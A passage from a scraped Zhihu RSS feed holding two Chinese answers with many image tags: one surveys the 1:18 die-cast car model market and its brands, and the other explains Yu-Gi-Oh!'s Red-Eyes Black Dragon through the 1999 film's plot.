data-original-src=\"v2-13d921c3575cfa2d8e0c05e4f30104be\" data-watermark-src=\"v2-da3ca76f33ba14ae7b7b9f0e7de5139f\" data-private-watermark-src=\"v2-f8f1a05106fd24ba539a82758b815905\"></p>\n<p>当然，还有一部分模型是可以做到 300-500 左右区间的原厂模型，可以做到全开门，不错的型准，后视镜、油箱盖等小细节可以动，但是差距依旧明显，比如漆面，相比成熟品牌会更容易起疹。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fdf6d41c395799367c82f04d235c705c_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fdf6d41c395799367c82f04d235c705c\" data-watermark-src=\"v2-51abdf291b1a91917a257f27ef8f9573\" data-private-watermark-src=\"v2-de872cf7ca173ab5aa00f510a527ebdb\"></p>\n<p> 这是十年前的情况，10 年间，整个静态模型的市场发生了翻天覆地的变化。整个世界范围内，似乎只有中国大陆对于这种大比例的静态模型还保持不错的兴趣和市场规模，其他市场合金静态模型市场快速萎缩，逐渐取而代之的是各种成本更低，形态效果更好，但是全封闭可玩性极低的树脂模型。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6f67128840dfcdb09e837dedbb39564e_720w.jpg?rss\" data-rawwidth=\"750\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"售价 1200 块的京商世纪树脂模型，内饰居然全是贴纸\" data-watermark=\"original\" data-original-src=\"v2-6f67128840dfcdb09e837dedbb39564e\" data-watermark-src=\"v2-67c7b2acb666bd9c6d8608724960bfed\" data-private-watermark-src=\"v2-6bf4d07a372ae7e18d3e166df2c874f5\"></p>\n<p>曾经在主流价位数一数二的巨头全部转向了其他的方向，迷你切和京商开始减少全开合金模型的开发，更多转向树脂材质，京商尚有劳斯莱斯幻影系列模型撑场，可以调整的座椅、中央扶手箱、后视镜、甚至独立的雨伞，做到巅峰的可玩性。可惜这款产品虽然在不断刷色，但是似乎依旧没有回本。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d02a668fd20679b522ee531cf557437_720w.jpg?rss\" data-rawwidth=\"796\" data-rawheight=\"796\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1d02a668fd20679b522ee531cf557437\" data-watermark-src=\"v2-794148c736e988ea27da01daad94a8be\" data-private-watermark-src=\"v2-0f51947cf723ad069a74c5c6aef7936f\"></p>\n<p>迷你切的合金系列甚至开始出现无法做到全开的作品，退步相当大，比如奥迪 RS6 模型和复刻后不能开后备箱的银色 300SL。堪称耻辱，现在更是玩上了合金龟车。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b6220b91706ae21e3bccd405e35bddd_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6b6220b91706ae21e3bccd405e35bddd\" data-watermark-src=\"v2-14a6154e108378d9f46daecd38dfa375\" data-private-watermark-src=\"v2-206f0e04ca7a080b4acd9c34aa8755c6\"></p>\n<p>AutoArt 倒是一直坚持在高品质全开门模型上，但是材质从锌合金转变为复合材质，说人话就是，有了更多塑料材料的成分在，售价也逐渐涨到 1000 甚至 1500 以上，并复刻了不少曾经的经典车型，比如捷豹 E-Type。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c72719d872a2292d3774b9b2bc0ad1ef_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c72719d872a2292d3774b9b2bc0ad1ef\" data-watermark-src=\"v2-11fc85857100ff0d9f9f3b18ce44df97\" data-private-watermark-src=\"v2-3561dc3245e980fb86eaf02933ea956e\"></p>\n<p>而在大陆这篇目前最为繁茂的成品合金模型市场上，又有广东这个曾经几乎主流品牌都有代工厂的所在地，目前的国产模型已经是这个样子了：</p>\n<p>首先是因为知名大 V 许群加入而知名度极高的 Almost Real，起点就相当高，1000 元出头的路虎系列和奔驰迈巴赫系列，做出了相当丰富的细节、可动件，这在除了 AA 以外的主流价位海外品牌身上已经许久没有看到了，如今产品价格也冲向了 1500 以上更高的区间。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7de9e6847d3f5d1bc2f2d796ef195208_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7de9e6847d3f5d1bc2f2d796ef195208\" data-watermark-src=\"v2-a802de625c91351837198f43cf8c7a09\" data-private-watermark-src=\"v2-f466467d0e34c3eb2dccf60e12c0c555\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f846442c0f1046649c9d21bb991baf9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1140\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1f846442c0f1046649c9d21bb991baf9\" data-watermark-src=\"v2-e95b9757651ede083ec0449bddcb0d3e\" data-private-watermark-src=\"v2-a53f2529a9c4d7b360620a8ff2289c81\"></p>\n<p>世纪龙也是近两年异军突起的一个新兴品牌，这家总部设在香港的模型品牌是做红旗模型最好的牌子，在不到千元的价格里把红旗还原到极致。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-993b98096c38c2c04619e27508e658f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-993b98096c38c2c04619e27508e658f2\" data-watermark-src=\"v2-e635b12e316d809e9c85f4bf4196e81e\" data-private-watermark-src=\"v2-ca4d719a5904c1c62ebd0d79840dcae7\"></p>\n<p>然后是小光最新的 1:18 凯迪拉克 Fleetwood：同样全开模型，美式豪华车的大皮革沙发细节，中网的镂空，展现的淋漓尽致，价格也达到了 1350 元。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c384a64b33065af7fc53589d040d958a_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c384a64b33065af7fc53589d040d958a\" data-watermark-src=\"v2-bfbc21c19f05c6014b938a79c36b02d1\" data-private-watermark-src=\"v2-35366950f29d3ac8538fda73724049b6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-096925c6cd2e414c3b05415284768a7d_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-096925c6cd2e414c3b05415284768a7d\" data-watermark-src=\"v2-a3be635d5c732547b487a401e7473449\" data-private-watermark-src=\"v2-4831629998746d64a157f7bd6a25a598\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d0f278c00f9b59a4313bb6e80583948_720w.jpg?rss\" data-rawwidth=\"975\" data-rawheight=\"975\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4d0f278c00f9b59a4313bb6e80583948\" data-watermark-src=\"v2-532be36521a266bea25833b7024f99de\" data-private-watermark-src=\"v2-afcceadbd5988fed39e5ab03076253ed\"></p>\n<p>其辉虽然和其他品牌比起来有些弱，但是在 1000 元左右也有立得住脚的产品，比如堪称 CMC 平替的普尔曼，相比 CMC 4000 多的售价，其辉用 1600 元做出了八成功力，也是相当不错的选择。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8dc3c9f5c3ec4b10cae340198fd08049_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"481\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8dc3c9f5c3ec4b10cae340198fd08049\" data-watermark-src=\"v2-b365658a7116b1620df1b979da6162a6\" data-private-watermark-src=\"v2-b0c09efb5d3cc3ee6c2225c58042e511\"></p>\n<p>如今国产模型已经冲刺到较高端的主流市场，同时收到了市场的认可。这些品牌能和 AA 能打的有来有回，虽然 Almost Real  因为收藏路线问题一直没有收，Fleetwood 已经是确定要入的了，至于其辉，我已经有 CMC 了，再买问题就在房子不在模型了……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6\" data-watermark-src=\"v2-7caa3d6d6c831a8c6d6fd5c8ffeb46b2\" data-private-watermark-src=\"v2-14e834606ccda55a7f30693466ecd654\"></p>\n<p><br></p>\n<hr>\n<p>刚好今天瞅见了，给你们看看曾经的国际大厂如今复刻老车型有多对付，minichamps 新的 E34，倒是六门可开，没想到这个前后死鱼眼分毫不改，同时淘宝售价 1200，累了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6aa7653408047b570fc30804512448e3_720w.jpeg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-6aa7653408047b570fc30804512448e3\" data-watermark-src=\"v2-e56549901bea2040316c75c1372f9d17\" data-private-watermark-src=\"v2-87fcb7bac50607f1804f28d4efb5a83f\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-58b01411a27dbb127a6e38a43cfa5f22_720w.jpeg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-58b01411a27dbb127a6e38a43cfa5f22\" data-watermark-src=\"v2-29ee68c98fef615ed596d21385d49041\" data-private-watermark-src=\"v2-2dfae0822b9fbf62b04d35d7c644457d\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mo-fu-ping-sheng-zhi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">逐行扫描</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">273 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265589988?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想找一个拼装玩具？</a><br><a href=\"http://www.zhihu.com/question/268619884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小孩子经常打扰我工作，有什么方法或者玩具车能让他安静的呆一边玩去？</a><br>\n","link":"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"《游戏王》中真红眼黑龙为什么被称为顶级卡片？","date":"2021-07-02 15:30:09","description":"\n<p>题主的问题，在原作中真红眼黑龙出场的第一页交代清楚了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-de8496b166a074c4d842b8f8ba9b40f3_720w.jpg?rss\" data-rawwidth=\"1965\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-de8496b166a074c4d842b8f8ba9b40f3\" data-watermark-src=\"v2-99b51489d7eaf9cfd7fd7cea5b43ef36\" data-private-watermark-src=\"v2-982a92469743b3c4a250c435d03c7efb\"></p>\n<p>在卡片交易市场行情中价值数十万的顶级稀有度，以及顶级的攻击力数值。这就是真红眼黑龙被称为顶级卡片的理由。</p>\n<p>首先说它数值顶级这点，你能在早期（决斗王国篇）数出很多攻击力超过真红眼的卡。但那种靠组合或战术堆起来的数值很显然还是不能算这张卡本身nb的。比如羽蛾的大飞蛾需要用很苛刻的条件让毛虫进化；神鹰女郎需要靠大量装备；鬼骨冢的活死人战术要用长时间来让僵尸慢慢强化。只算基础能力值的话，真红眼黑龙确实已经非常高了，在它之上的青眼白龙、黑魔术师、恶魔的召唤，都一样是被评价为万里挑一的稀有卡的。</p>\n<p><br></p>\n<p>大概也是因为比起各种铺垫的青眼白龙，它出现得太突兀了，当时的动画组在这上面做了些文章，围绕这张卡专门做了一个剧场版动画。这就是东映出品、延续自朝日版游戏王的，游戏王历史真正意义的第一个剧场动画，1999年剧场版《游戏王》，民间俗称《游戏王-真红眼黑龙》。下面跟大家讲解下这部30分钟的剧场动画剧情。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4ba72e49cf1604015a850ed10fbf1ccc_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4ba72e49cf1604015a850ed10fbf1ccc\" data-watermark-src=\"v2-76ebddacc6660d93d00c17c6693b32bc\" data-private-watermark-src=\"v2-dc4afc5dc54109d6e3de088d9b817937\"></p>\n<p>故事讲述的是武藤游戏邻居家，一个胆小懦弱、常被同龄人欺负的小孩，青山翔吾。他在偶然间去卡店抽包，开出了真红眼黑龙。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c3f4a3a47a435edf185bc6db1a208e0_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4c3f4a3a47a435edf185bc6db1a208e0\" data-watermark-src=\"v2-7e95c21c2ad1b87c950d6c5929fdd79b\" data-private-watermark-src=\"v2-1b1e840921f30bb326168e8fcedf9b77\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b322c8386b0d2eff778f4942d6441d6_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2b322c8386b0d2eff778f4942d6441d6\" data-watermark-src=\"v2-0ced17d36be6d827f7e7a455ad1fec7b\" data-private-watermark-src=\"v2-b4989c7581ed4411ffcdf274ac9cec72\"></p>\n<p>卡店老板说明，这是和青眼白龙齐名的顶级稀有卡。显然出于大家可以理解的历史的局限性，她无法预知20多年后青眼白龙的身价上升到了8700万人民币。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-35ddc28e9c24d2d52508890794576a0b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35ddc28e9c24d2d52508890794576a0b\" data-watermark-src=\"v2-36d122f19e98b7863bfa11de921e8a7f\" data-private-watermark-src=\"v2-af10254c06f07702884d31adf7d82c7a\"></p>\n<p>得到了真红眼黑龙的翔吾自然把欺负他的大孩子吓了一跳。但他从未用真红眼黑龙决斗过。只是出示这张卡证明自己已经不会输给任何人了。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1f13d661b84c5c27776a716a9fbaf80_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1f13d661b84c5c27776a716a9fbaf80\" data-watermark-src=\"v2-68c8cda4d377f033a5c8d243935a46a4\" data-private-watermark-src=\"v2-76acaa397785974c8aa53056cf49795d\"></p>\n<p>长期监视着童实野各大卡店的海马知道了这件事。他举办了一场赌上稀有卡的邀请赛，一方面想弄到翔吾手上的真红眼，另一方面也是为了击败游戏。</p>\n<p>中途，游戏和城之内在去参加过程中撞见海马的保镖，他抢走翔吾的真红眼并和游戏、城之内产生肢体摩擦。最后城之内帮翔吾夺回了真红眼，并将其加入到游戏卡组中去对战海马。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d85dd3a03015e9265ada754b38ed851d_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d85dd3a03015e9265ada754b38ed851d\" data-watermark-src=\"v2-04de5df3093bf8e6ff4469f9e86b52b1\" data-private-watermark-src=\"v2-13a39ecd27d896cd792b165d8ee82cf6\"></p>\n<p>王样和海马的对战使用的是王国篇里海马展示过的圆形决斗盘。决斗过程主要复刻自王国篇王样对阵傀儡师的流程，用黑魔术师+魔术礼帽+六芒星的咒缚的组合击破一只青眼白龙。</p>\n<p><br></p>\n<p>之后海马死者苏生出青眼白龙，并发动邪恶锁链，将三只青眼白龙结合到一起。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-40ccda1eb2fc9cbf42312cd0ad76c0f4_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-40ccda1eb2fc9cbf42312cd0ad76c0f4\" data-watermark-src=\"v2-857f98cfd7af410f95aedefb4f5f818b\" data-private-watermark-src=\"v2-6e7183e44da4ea3a262ea0cdc45cfabf\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-accea74dc4a582328b7bc200441c3e09_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-accea74dc4a582328b7bc200441c3e09\" data-watermark-src=\"v2-22982e0c9aa3112eaf83d64418eace05\" data-private-watermark-src=\"v2-d789760ce392bdd811d83b8e72aa4bdb\"></p>\n<p>这不是融合，所以这样结合出来的也并不是青眼究极龙。它的正式名字叫“青眼の白竜３体連結”。ZZ玩家可能对这张卡有印象，但要说它是纯粹的ZZ自创的假卡还真有点冤枉它了。这张卡是来自于游戏王的版权还属于万代的时期，由万代出品的卡片。ZZ卡的卡图也是原封不动照搬的这个。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-120044f5bde94ce65f122d5ebd5f863b_720w.jpg?rss\" data-rawwidth=\"368\" data-rawheight=\"366\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-120044f5bde94ce65f122d5ebd5f863b\" data-watermark-src=\"v2-48eefe6524ad3d1cd1571dcbaa84beed\" data-private-watermark-src=\"v2-4a5fa0cd1cfdf5e23d9569e1f900bab2\"></p>\n<p>说回正题。面对强大的三只青眼白龙，此时王样唯一的胜机就在真红眼身上了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4be5dea37562bae0f42a121ee212aa48_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4be5dea37562bae0f42a121ee212aa48\" data-watermark-src=\"v2-b0f3c1440fe26fd1f89922f6437b9160\" data-private-watermark-src=\"v2-4a70ab516e498a559ff4997bdf6da267\"></p>\n<p>翔吾见王样赢不了，习惯性的想逃避。城之内拉住他，让他坚持下去。真红眼是他的卡，王样使用真红眼需要他的斗志。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7cf29ac0bdbc0b54324d25d6215cdc59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7cf29ac0bdbc0b54324d25d6215cdc59\" data-watermark-src=\"v2-1b39801a3b3ea5e46a061b0f243ed800\" data-private-watermark-src=\"v2-9feb7cd3a596ccb938d53d414a37cf73\"></p>\n<p>翔吾拥有真红眼过后依然不敢和人决斗。他惧怕自己有了真红眼后依然打不过别人，那样会更加“站不起来”。城之内让他不要再抱着卡片做梦。既然是决斗者，就要敢于面对战斗，敢于面对自己。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c1b54038425e66aefc7abc56b31edd72_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1b54038425e66aefc7abc56b31edd72\" data-watermark-src=\"v2-49f42251f923c6168dcb58ecfab985c2\" data-private-watermark-src=\"v2-8e33b80dde93ac942f2589d3d0a954ee\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e21eba2bfa439eb94254d30bdfbb206c_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e21eba2bfa439eb94254d30bdfbb206c\" data-watermark-src=\"v2-a9766a26c9952e9f63ccccb31e0f39c0\" data-private-watermark-src=\"v2-edfcf1a96d6163a6518ba48a3dedf460\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-300c32bd0ebf2424d72757004c30d78b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-300c32bd0ebf2424d72757004c30d78b\" data-watermark-src=\"v2-a57ffe72cba93f1e92467fb13548b591\" data-private-watermark-src=\"v2-356bd45eb67ec616cd0d7e7c514e1dda\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9a5198ca905345febe360d7f8abaf431_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9a5198ca905345febe360d7f8abaf431\" data-watermark-src=\"v2-6218f9d0dc4a74ae5a5f4d24fcd3f777\" data-private-watermark-src=\"v2-b77920fd51f3705ba782613908c5539c\"></p>\n<p>这里开始切入主题了。真正的决斗者不是靠稀有卡，而是靠自身的斗志，和相信胜利的可能性。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f48477eb153f2137d5a6ca88ddde7299_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-f48477eb153f2137d5a6ca88ddde7299\" data-watermark-src=\"v2-1924854fa64cd296123530d8925e2dbf\" data-private-watermark-src=\"v2-2dda31921ba894894426baa75313fed8\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-01b60dea8154a8ae06e08572e36ba52e_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-01b60dea8154a8ae06e08572e36ba52e\" data-watermark-src=\"v2-b4c937bc9be531ff0cac1a737678e7fc\" data-private-watermark-src=\"v2-11649c36d8f534676845ea98862b7108\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3dca4ecafcff91cecf94f07e412e75f5_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3dca4ecafcff91cecf94f07e412e75f5\" data-watermark-src=\"v2-807892f8679fedb0eee7f733bc000478\" data-private-watermark-src=\"v2-6a490e4a309b5ce61801ef11bef132f3\"></p>\n<p>这段台词是整部《真红眼黑龙》的核心。“可能性”既是黑龙带来的，也是决斗者带来的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b199dba4d6b81b6b7c2a2cfd918f6d10_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b199dba4d6b81b6b7c2a2cfd918f6d10\" data-watermark-src=\"v2-aafc58514796dc2f65841d4667f0dad6\" data-private-watermark-src=\"v2-49f7db76007d200e0cb58fdc6426f4cb\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-12f0f67e06b7f4d0b961cfd9ffff3e99_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-12f0f67e06b7f4d0b961cfd9ffff3e99\" data-watermark-src=\"v2-76b4103dc057562909ebda916f22d3c6\" data-private-watermark-src=\"v2-3f264c847c31584ebedd1eef63e8b049\"></p>\n<p>顿悟的翔吾鼓起勇气并传达给王样。王样终于召唤出真红眼黑龙。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c7a5c7b45ce9cd8ca46e78bdffcbab51_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c7a5c7b45ce9cd8ca46e78bdffcbab51\" data-watermark-src=\"v2-6fb212ffaa8a00d8033e28306c3dbfdc\" data-private-watermark-src=\"v2-061acdd03e59ab0fa514f14d58401a45\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b75e5b2375bcc62beed90c69dc3b4998_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b75e5b2375bcc62beed90c69dc3b4998\" data-watermark-src=\"v2-1544740aea36eda0567606cf46800e4c\" data-private-watermark-src=\"v2-0848dd652d92c968435a2fb1445d4c1f\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d444634dfbc07b76e4593d8560521d59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d444634dfbc07b76e4593d8560521d59\" data-watermark-src=\"v2-a3cd9ccc3a20ae738c5f98ff4da32a53\" data-private-watermark-src=\"v2-bc434c67a1bd6b931e26dd1c76b50638\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2599b082deb8ac5c855410a767f939e3_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2599b082deb8ac5c855410a767f939e3\" data-watermark-src=\"v2-ce75647a7cfef51e565f41b8a7d4fceb\" data-private-watermark-src=\"v2-46058fba60dd940bd3c3bb0fa53cb3dc\"></p>\n<p>出场时的气势还是很赞的。但是……</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-28b4a3f22eaa96d16e3dd2f0461b1f78_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-28b4a3f22eaa96d16e3dd2f0461b1f78\" data-watermark-src=\"v2-9663b0345331ed36d4e6ab0916639634\" data-private-watermark-src=\"v2-baa6ad6a253eb57061de3aac6d00549e\"></p>\n<p>马上就被拿来融合了。</p>\n<p><br></p>\n<p>真红眼和王样场上的流星龙融合，成了流星黑龙。没错，不仅流星黑龙其实是王样用出来的，流星龙也是。不动游星是谁？不太熟啊。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-21644bdec8494533f4d5ca74c849e9e1_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21644bdec8494533f4d5ca74c849e9e1\" data-watermark-src=\"v2-1be39fc4c49833734b715f95a4d9c401\" data-private-watermark-src=\"v2-a03461db1e2d7ad27582fc2c57f79768\"></p>\n<p>流星黑龙击败青眼白龙3体连接，打败海马。从这场战斗中得到勇气的翔吾也能正常的打牌了。以前欺负他的大孩子也成为了朋友。故事结束。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a731ad00351e78791660f0fd831af552_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a731ad00351e78791660f0fd831af552\" data-watermark-src=\"v2-668313755bd6f67fffc47bf8d7a4d8ac\" data-private-watermark-src=\"v2-8d47c374e0ceaa9164b723b08b20da27\"></p>\n<p><br></p>\n<p><br></p>\n<p>这个剧场版除了赋予“白龙带来胜利，黑龙带来可能性”这个象征意义外，还通过这个故事把真红眼与决斗者的斗志绑在了一起。当然，这是因为原作剧情后来真红眼成了城之内的卡。对于城之内这么一个从区大赛8强起步，一步步打成决斗城市准决赛的底层励志角色来说，斗志、可能性，形容的既是真红眼，也是城之内本人。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-19e3732cb72fd604fd3360ffd54d24a4_720w.jpg?rss\" data-rawwidth=\"417\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-19e3732cb72fd604fd3360ffd54d24a4\" data-watermark-src=\"v2-5f4749a46372bb0705dfdce610b9e6de\" data-private-watermark-src=\"v2-0ee58a90d087c32beab8034cea7ce063\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-bab92ffcdfde35c55ab16b9fca0b453a_720w.jpg?rss\" data-rawwidth=\"1982\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bab92ffcdfde35c55ab16b9fca0b453a\" data-watermark-src=\"v2-d9431e0a6137d2f3de9c7c71a95f21d2\" data-private-watermark-src=\"v2-780680b647173086b1f2d480a43b518d\"></p>\n<p>在决斗城市开幕期间，城之内认为自己实力还配不上使用真红眼，将其交给了王样保管，由此这张卡也成为了代表2人羁绊的卡。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4727bd92b988637efd4eb30e7b7a4c2a_720w.jpg?rss\" data-rawwidth=\"2030\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4727bd92b988637efd4eb30e7b7a4c2a\" data-watermark-src=\"v2-9125de54350c74c73eee1fd89e77cf0c\" 